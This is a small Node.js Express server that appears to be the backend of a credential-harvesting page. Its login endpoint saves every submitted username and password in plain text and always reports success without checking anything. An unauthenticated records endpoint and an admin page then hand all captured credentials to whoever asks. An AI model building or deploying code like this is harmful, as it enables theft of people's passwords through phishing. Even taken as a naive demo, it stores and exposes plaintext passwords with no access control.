const express = require('express');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Simple in-memory storage
let records = [];

// Save login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    records.push({
        type: 'Login',
        username,
        password,
        time: new Date().toLocaleString()
    });
    console.log('Login Saved:', username);
    res.json({ success: true });
});

// Get records
app.get('/api/records', (req, res) => {
    res.json(records);
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});